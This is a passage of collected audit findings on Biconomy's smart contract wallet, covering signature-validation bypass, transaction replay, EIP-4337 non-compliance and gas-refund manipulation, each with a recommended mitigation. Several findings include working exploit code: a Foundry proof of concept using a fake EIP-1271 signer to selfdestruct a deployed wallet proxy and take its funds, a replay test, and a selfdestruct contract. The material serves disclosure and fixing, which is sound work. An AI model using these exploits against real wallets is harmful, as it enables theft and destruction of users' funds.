(requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only "require" it here so that the revert reason on invalid signature will be of "VerifyingPaymaster", and not "ECDSA"         require(sigLength == 64 || sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), "VerifyingPaymaster: wrong signature");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], "Insufficient balance for paymaster id");         return (userOp.paymasterContext(paymasterData), 0);     } ``` ## Proof of Concept https://github.com/OpenZeppelin/openzeppelin-contracts/commit/e1878ace8c2908b85d39f9925c68c6f738cf3325 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/package.json#L61-L62 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L107-L108 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L363-L374 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only "require" it here so that the revert reason on invalid signature will be of "VerifyingPaymaster", and not "ECDSA" -       require(sigLength == 64 || sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData"); +       require(sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), "VerifyingPaymaster: wrong signature");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], "Insufficient balance for paymaster id");         return (userOp.paymasterContext(paymasterData), 0);     } ```
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511   # Vulnerability details  ## Impact As specified in the [EIP](https://eips.ethereum.org/EIPS/eip-4337#forbidden-opcodes) certain opcodes are forbidden when a UserOperation is validated because their outputs can differ between simulation and execution. One of those opcodes is `ORIGIN`. The SmartAccount uses that opcode in its validation logic. The client will reject those UserOperations because they are invalid. The wallet won't be usable with EIP-4337.  Because this breaks the main functionality of the wallet I rate it as HIGH.  ## Proof of Concept In `validateUserOp()` the contract calls `_validateSignature()` which in turn accesses `tx.origin` and thus the `ORIGIN` opcode: ```sol     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)     external override virtual returns (uint256 deadline) {         _requireFromEntryPoint();         deadline = _validateSignature(userOp, userOpHash, aggregator);         if (userOp.initCode.length == 0) {             _validateAndUpdateNonce(userOp);         }         _payPrefund(missingAccountFunds);     }      function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)     internal override virtual returns (uint256 deadline) {         bytes32 hash = userOpHash.toEthSignedMessageHash();         //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)         // solhint-disable-next-line avoid-tx-origin         require(owner == hash.recover(userOp.signature) || tx.origin == address(0), "account: wrong signature");         return 0;     } ```  The EIP specifies that for the simulation, the client calls `EntryPoint.simulateValidation()`. That function calls account's `validateUserOp()` function which triggers the forbidden opcode: https://eips.ethereum.org/EIPS/eip-4337#specification-1  You can find it in the implementation as well: https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/core/EntryPoint.sol#L267-L273  ## Tools Used none  ## Recommended Mitigation Steps There's no real reason to check that `tx.origin == address(0)`. It's not specified in the EIP. Just remove it. 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xdeadbeef0x-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  A hacker can create arbitrary transaction through the smart wallet by evading signature validation.   Major impacts: 1. Steal **all** funds from the smart wallet and destroy the proxy 2. Lock the wallet from EOAs by updating the implementation contract  1. New implementation can transfer all funds or hold some kind of ransom  2. New implementation can take time to unstake funds from protocols  ## Proof of Concept  The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342 ``` function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { ---------             checkSignatures(txHash, txHashData, signatures);         } ---------             success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas); ---------         }     }  function checkSignatures(         bytes32 dataHash,         bytes memory data,         bytes memory signatures     ) public view virtual { ----------         if(v == 0) { ----------             _signer = address(uint160(uint256(r))); ----------                 require(uint256(s) >= uint256(1) * 65, "BSA021"); ----------                 require(uint256(s) + 32 <= signatures.length, "BSA022"); -----------                 assembly {                     contractSignatureLen := mload(add(add(signatures, s), 0x20))                 }                 require(uint256(s) + 32 + contractSignatureLen <= signatures.length, "BSA023"); -----------                 require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "BSA024"); -----------     } ```  `checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract.   A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.   As `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.  ### Impact #1 - Self destruct and steal all funds  Consider the following scenario: 1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `SelfDestructingContract` that `selfdestruct`s when called 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`  2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Proxy contract is destroyed   1. Hacker received all funds that were in the wallet  ### Impact #2 - Update implementation and lock out EOA    1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)`   2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Implementation was updated to `MaliciousImplementation`  1. Hacker transfers all native and ERC20 tokens to himself  2. Hacker unstakes EOA funds from protocols   3. Hacker might try to ransom the protocol/EOAs to return to previous implementation 5. Proxy cannot be redeployed for the existing EOA  ### Foundry POC  The POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.  The POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.  The POC use a smart wallet proxy contract that is deployed on `goerli` chain: proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09  You will need to install a foundry. Please follow these instruction for the setup: https://book.getfoundry.sh/getting-started/installation  After installing, create a workdir by issuing the command: `forge init --no-commit`   Create the following file in `test/DestroyWalletAndStealFunds.t.sol`: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol";  contract Enum {     enum Operation {Call, DelegateCall} } interface SmartAccount {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external payable returns (bool success);      function getNonce(uint256 batchId) external view returns (uint256); } struct Transaction {         address to;         uint256 value;         bytes data;         Enum.Operation operation;         uint256 targetTxGas;     } struct FeeRefund {         uint256 baseGas;         uint256 gasPrice; //gasPrice or tokenGasPrice         uint256 tokenGasPriceFactor;         address gasToken;         address payable refundReceiver;     } contract FakeSigner {     bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;      // Always return valid EIP1271_MAGIC_VALUE     function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {         return EIP1271_MAGIC_VALUE;     } } contract SelfDestructingContract {     // All this does is self destruct and send funds to "to"     function selfDestruct(address to) external {         selfdestruct(payable(to));     } }  contract DestroyWalletAndStealFunds is Test {     SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);     address hacker = vm.addr(0x1337);     SelfDestructingContract sdc;     FakeSigner fs;     function setUp() public {         // Create self destruct contract         sdc = new SelfDestructingContract();         // Create fake signer         fs = new FakeSigner();          // Impersonate hacker         vm.startPrank(hacker);         // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker          bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);         // Create transaction specifing SelfDestructingContract as target and as a delegate call         Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);         // Create FeeRefund         FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));          bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));         // Add fake signature (r,s,v) to pass all requirments.         // v=0 to indicate eip-1271 signer "fakeSignerPadded" which will always return true         bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));         // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.         proxySmartAccount.execTransaction(transaction, 0, fr, signatures);         vm.stopPrank();     }      function testProxyDoesNotExist() public {         uint size;         // Validate that bytecode size of the proxy contract is 0 becuase of self destruct          address proxy = address(proxySmartAccount);         assembly {           size := extcodesize(proxy)         }         assertEq(size,0);     }      function testRevertWhenCallingWalletThroughProxy() public {         // Revert when trying to call a function in the proxy          proxySmartAccount.getNonce(0);     } } ```  To run the POC and validate that the proxy does not exist after destruction: ``` forge test -m testProxyDoesNotExist -v --fork-url="<GOERLI FORK RPC>" ```  Expected output:  ``` Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [PASS] testProxyDoesNotExist() (gas: 4976) Test result: ok. 1 passed; 0 failed; finished in 4.51s ```  To run the POC and validate that the EOA cannot interact with the wallet after destruction: ``` forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url="<GOERLI FORK RPC>" ```  Expected output:  ``` Failing tests: Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds [FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092) ```  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  The protocol should validate before calling `isValidSignature` that `_signer` is `owner` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L36   # Vulnerability details  ### Impact  Proxy.sol is an enforcer of the the user's wallet standard. In its fallback function, it calls the actual implementation in order to handle additional logic.  If Proxy.sol is called with no calldata and some msg.value, the call will reach the receive() function, which does not forward the call down to the implementation.  This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value.  This logic is never reached, the entire msg.value is just leaked.   ```js contracts/smart-contract-wallet/Proxy.sol:   35     36:     receive() external payable {   37:         emit Received(msg.value, msg.sender, "");   38:     } ```  ### Proof Of Concept  Because the implementation contract is a constant , although we can confirm whether the `receive()` function exists, a different vulnerability is exposed this time; Even if the proxy contract can receive ether with `receive()`, there is no withdraw function to withdraw this ether and ethers remain locked in the contract.   ### Recommended Mitigation Steps  Consider moving the `receive()` function to the implementation contract 
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Paymaster's signature can be replayed to drain their deposits  ## Proof of Concept  Scenario :  - user A is happy with biconomy and behaves well biconomy gives some sponsored tx using verifyingPaymaster -- let's say paymaster's signature as sig X - user A becomes not happy with biconomy for some reason and A wants to attack biconomy - user A delegate calls to Upgrader and upgrade it's sender contract to MaliciousAccount.sol - MaliciousAccount.sol does not check any nonce and everything else is same to SmartAccount(but they can also add some other details to amplify the attack, but let's just stick it this way) - user A uses sig X(the one that used before) to initiate the same tx over and over - user A earnes nearly nothing but paymaster will get their deposits drained   files : Upgrader.sol, MaliciousAccount.sol, test file https://gist.github.com/leekt/d8fb59f448e10aeceafbd2306aceaab2   ## Tools Used hardhat test, verified with livingrock  ## Recommended Mitigation Steps Since `validatePaymasterUserOp` function is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not   ``` mapping(bytes32 => boolean) public usedHash      function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);         require(!usedHash[hash], "used hash");         usedHash[hash] = true; ```
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444   # Vulnerability details  ## Impact The submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) * gasPrice / tokenGasPriceFactor$. `baseGas`, `gasPrice`, and `tokenGasPriceFactor` are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the `tokenGasPriceFactor` value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for `tokenGasPriceFactor`. That way they can increase the actual gas repayment and steal the user's funds.  ## Proof of Concept In `encodeTransactionData()` we can see that `tokenGasPriceFactor` is not included: ```sol     function encodeTransactionData(         Transaction memory _tx,         FeeRefund memory refundInfo,         uint256 _nonce     ) public view returns (bytes memory) {         bytes32 safeTxHash =             keccak256(                 abi.encode(                     ACCOUNT_TX_TYPEHASH,                     _tx.to,                     _tx.value,                     keccak256(_tx.data),                     _tx.operation,                     _tx.targetTxGas,                     refundInfo.baseGas,                     refundInfo.gasPrice,                     refundInfo.gasToken,                     refundInfo.refundReceiver,                     _nonce                 )             );         return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);     } ```  The value is used to determine the gas repayment in `handlePayment()` and `handlePaymentRevert()`: ```sol     function handlePayment(         uint256 gasUsed,         uint256 baseGas,         uint256 gasPrice,         uint256 tokenGasPriceFactor,         address gasToken,         address payable refundReceiver     ) private nonReentrant returns (uint256 payment) {         // uint256 startGas = gasleft();         // solhint-disable-next-line avoid-tx-origin         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;         if (gasToken == address(0)) {             // For ETH we will only adjust the gas price to not be higher than the actual used gas price             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);             (bool success,) = receiver.call{value: payment}("");             require(success, "BSA011");         } else {             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);             require(transferToken(gasToken, receiver, payment), "BSA012");         }         // uint256 requiredGas = startGas - gasleft();         //console.log("hp %s", requiredGas);     } ```  That's called at the end of `execTransaction()`: ```sol             if (refundInfo.gasPrice > 0) {                 //console.log("sent %s", startGas - gasleft());                 // extraGas = gasleft();                 payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);                 emit WalletHandlePayment(txHash, payment);             } ```  As an example, given that: - `gasUsed = 1,000,000` - `baseGas = 100,000` - `gasPrice = 10,000,000,000` (10 gwei) - `tokenGasPriceFactor = 18`  You get $(1,000,000 + 100,000) * 10,000,000,000 / 18 = 6.1111111e14$. If the submitter executes the transaction with `tokenGasPriceFactor = 1` they get $1.1e16$ instead, i.e. 18 times more. ## Tools Used none  ## Recommended Mitigation Steps `tokenGasPriceFactor` should be included in the encoded transaction data and thus verified by the user's signature.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ladboy233-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chaduke-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/prady-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/btk-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/privateconstant-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212   # Vulnerability details  ## Impact Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never dissapears  ## Why it possible Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.  ## Proof of Concept Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:      it("replay EIP712 sign transaction", async function () {       await token       .connect(accounts[0])       .transfer(userSCW.address, ethers.utils.parseEther("100"));      const safeTx: SafeTransaction = buildSafeTransaction({       to: token.address,       data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),       nonce: await userSCW.getNonce(0),     });      const chainId = await userSCW.getChainId();     const { signer, data } = await safeSignTypedData(       accounts[0],       userSCW,       safeTx,       chainId     );      const transaction: Transaction = {       to: safeTx.to,       value: safeTx.value,       data: safeTx.data,       operation: safeTx.operation,       targetTxGas: safeTx.targetTxGas,     };     const refundInfo: FeeRefund = {       baseGas: safeTx.baseGas,       gasPrice: safeTx.gasPrice,       tokenGasPriceFactor: safeTx.tokenGasPriceFactor,       gasToken: safeTx.gasToken,       refundReceiver: safeTx.refundReceiver,     };      let signature = "0x";     signature += data.slice(2);       await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         0, // batchId         refundInfo,         signature       )     ).to.emit(userSCW, "ExecutionSuccess");      //contract checks nonces[batchId] but not batchId itself     //so we can change batchId to the one that have the same nonce     //this would replay transaction     await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         1, // changed batchId         refundInfo,         signature       )     ).to.emit(userSCW, "ExecutionSuccess");      //charlie would have 20 tokens after this     expect(await token.balanceOf(charlie)).to.equal(       ethers.utils.parseEther("20")     );     });  ## Recommended Mitigation Steps add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/csanuragjain-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/nadin-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Sathish9098-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/HE1M-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Raiders-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/arialblack14-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pavankv-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/adriro-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/juancito-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pauliax-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rageur-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68   # Vulnerability details  ## Impact  Some parts of the codebase are not compliant with the EIP-4337 from the [EIP-4337 specifications](https://eips.ethereum.org/EIPS/eip-4337#specification), at multiple degrees of severity.  ## Proof of Concept  ### Sender existence  ```text Create the account if it does not yet exist, using the initcode provided in the UserOperation. If the account does not exist, and the initcode is empty, or does not deploy a contract at the “sender” address, the call must fail. ```  If we take a look at the [`_createSenderIfNeeded()`]() function, we can see that it's not properly implemented: ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  if (initCode.length != 0) {   address sender = opInfo.mUserOp.sender;      if (sender.code.length != 0) revert FailedOp(opIndex, address(0), "AA10 sender already constructed");        address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), "AA13 initCode failed or OOG");         if (sender1 != sender) revert FailedOp(opIndex, address(0), "AA14 initCode must return sender");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), "AA15 initCode must create sender");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  The statement in the EIP implies that if the account does not exist, the initcode **must** be used. In this case, it first check if the initcode exists, but this condition should be checked later.  This could be rewritten to:  ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  address sender = opInfo.mUserOp.sender;  if (sender.code.length == 0) {   require(initCode.length != 0, "empty initcode");   address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), "AA13 initCode failed or OOG");         if (sender1 != sender) revert FailedOp(opIndex, address(0), "AA14 initCode must return sender");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), "AA15 initCode must create sender");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  ### Account  The third specification of the [`validateUserOp()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68) is the following:  ```text If the account does not support signature aggregation, it MUST validate the signature is a valid signature of the userOpHash, and SHOULD return SIG_VALIDATION_FAILED (and not revert) on signature mismatch. Any other error should revert. ```  This is currently not the case, as the case when the account does not support signature aggregation is not supported right now in the code. The `validateUserOp()` [reverts everytime](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329) if the recovered signature does not match.  Additionally, the `validateUserOp()` should return a time range, as per the EIP specifications:  ```text The return value is packed of sigFailure, validUntil and validAfter timestamps.   - sigFailure is 1 byte value of “1” the signature check failed (should not revert on signature failure, to support estimate)   - validUntil is 8-byte timestamp value, or zero for “infinite”. The UserOp is valid only up to this time.   - validAfter is 8-byte timestamp. The UserOp is valid only after this time. ```  This isn't the case. It just returns a signature deadline validity, which would probably be here the `validUntil` value.  ### Aggregator  This part deals with the aggregator interfacing:  ```text validateUserOp() (inherited from IAccount interface) MUST verify the aggregator parameter is valid and the same as getAggregator  ...  The account should also support aggregator-specific getter (e.g. getAggregationInfo()). This method should export the account’s public-key to the aggregator, and possibly more info (note that it is not called directly by the entryPoint)  ...  If an account uses an aggregator (returns it with getAggregator()), then its address is returned by simulateValidation() reverting with ValidationResultWithAggregator instead of ValidationResult ```  This aggregator address validation is not [done](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68).  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Refactor the code that is not compliant with the EIP
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23   # Vulnerability details  ## Description  If the `SmartAccount` implementation contract is not initialized, it can be destroyed using the following attack scenario:  - Initialize the `SmartAccount` **implementation** contract using the `init` function. - Execute a transaction that contains a single `delegatecall` to a contract that executes the `selfdestruct` opcode on any incoming call, such as:  ```solidity= contract Destructor {     fallback() external {         selfdestruct(payable(0));     } } ```  The destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the `Singleton` functionality and the entire contract would be destroyed, leaving only the functionality from the Proxy contract accessible.  ---  In the deploy script there is the following logic:  ```typescript const SmartWallet = await ethers.getContractFactory("SmartAccount"); const baseImpl = await SmartWallet.deploy(); await baseImpl.deployed(); console.log("base wallet impl deployed at: ", baseImpl.address); ```  So, in the deploy script there is no enforce that the `SmartAccount` contract implementation was initialized.  The same situation in `scw-contracts/scripts/wallet-factory.deploy.ts` script.  ---  Please note, that in case only the possibility of initialization of the `SmartAccount` implementation will be banned it will be possible to use this attack. This is so because in such a case `owner` variable will be equal to zero and it will be easy to pass a check inside of `checkSignatures` function using the fact that for incorrect input parameters `ecrecover` returns a zero address.  ## Impact  Complete freezing of all functionality of all wallets (including complete funds freezing).  ## Recommended Mitigation Steps  Add to the deploy script initialization of the `SmartAccount` implementation, or add to the `SmartAccount` contract the following constructor that will prevent implementation contract from the initialization:  ```solidity= // Constructor ensures that this implementation contract can not be initialized constructor() public {     owner = address(1); } ```
